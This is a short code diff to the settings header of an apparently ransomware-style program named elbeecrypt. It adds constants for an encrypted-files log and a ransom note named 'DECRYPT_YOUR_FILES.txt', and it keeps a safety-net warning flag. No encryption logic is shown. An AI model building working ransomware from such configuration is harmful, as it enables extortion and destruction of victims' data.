@@ -15,11 +15,17 @@ namespace elbeecrypt::common::Settings {
 	/** The extension to use for encrypted files. */
 	const std::string ENCRYPTED_EXTENSION = "elbeecrypt";
 
+	/** The name of the encrypted files log. */
+	const std::string ENCRYPTED_FILES_LIST_NAME = "elbeecrypt-encrypted.txt";
+
 	/** The name of the private key to drop. */
-	const std::string ENCRYPTION_KEY_NAME = "elbeecrypt-privkey_{pubkeyFingerprint}.elbeecrypt-key";
+	const std::string ENCRYPTION_KEY_NAME = "elbeecrypt-privkey_%pubkeyFingerprint%.elbeecrypt-key";
 
 	/** The amount of worker threads that should be spawned to encrypt or decrypt files. */
 	constexpr uint8_t ENCRYPTION_THREADS = 10;
+
+	/** The name of the ransom note. */
+	const std::string RANSOM_NOTE_NAME = "DECRYPT_YOUR_FILES.txt";
 
 	/** Whether there should be a warning before running. */
 	constexpr bool SAFETY_NET = true;
